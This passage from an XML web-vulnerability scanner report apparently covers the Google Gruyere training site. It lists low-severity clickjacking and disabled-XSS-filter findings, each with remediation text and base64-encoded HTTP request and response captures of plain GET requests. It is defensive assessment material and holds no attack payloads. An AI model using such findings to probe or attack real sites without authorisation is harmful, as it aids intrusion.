      <request method="GET" base64="true"><![CDATA[R0VUIC8yIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogODI0NWZiNTU3MmQ4MDY0YmNkN2NmNGQ4YmJjOTRlYWENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMTozNyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4567030629771972608</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/2/]]></path>
    <location><![CDATA[/2/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8yLyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogM2Q1MGIwNTgyNTY2NDk2ODZkYWRmNTlmOTU5YTM5YWINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMTo0MyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7307352493626533888</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/3]]></path>
    <location><![CDATA[/3]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8zIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMmU4MDg0OTkyNzQ3OWYxOTU4ZDAwMDdmZDJjN2NjNzMNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMTo0NiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6982230055227258880</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/3/]]></path>
    <location><![CDATA[/3/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8zLyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZjRiZDdmNzk3ZThjZWUzYzg0OWU0YzUzYWQzY2VhZWYNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMTo0OCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>74872599940662272</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/4]]></path>
    <location><![CDATA[/4]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYjUyMGQ1YmVjZmMwYTc2YjgyYmY1ZDUxNjY1NDlkYzINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMjoxMSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6119061309408496640</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/4/]]></path>
    <location><![CDATA[/4/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80LyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYzMyZDY2ZWNlMzQ4ZGZiOWExNzJmNGQzNTZkZjRkMmYNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMjoyMCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>46782744205751808</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vc3RhcnQNCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMzAyIEZvdW5kDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KTG9jYXRpb246IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvDQpQcmFnbWE6IG5vLWNhY2hlDQpDb250ZW50LXR5cGU6IHRleHQvaHRtbA0KWC1YU1MtUHJvdGVjdGlvbjogMA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiBlMTc3ZmYxMTIxNzA3ODc4OGIwMzRhODRlNzFkNmFjYQ0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpEYXRlOiBUaHUsIDE4IEphbiAyMDE4IDA5OjM5OjMwIEdNVA0KU2VydmVyOiBHb29nbGUgRnJvbnRlbmQNCkNvbnRlbnQtTGVuZ3RoOiAyMDUNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAnLS8vVzNDLy9EVEQgSFRNTC8vRU5cPgogICAgICAgIDxodG1sPjxib2R5PgogICAgICAgIDx0aXRsZT4zMDIgUmVkaXJlY3Q8L3RpdGxlPgogICAgICAgIFJlZGlyZWN0ZWQgPGEgaHJlZj0iLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8iPmhlcmU8L2E+CiAgICAgICAgPC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7048798880424564736</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
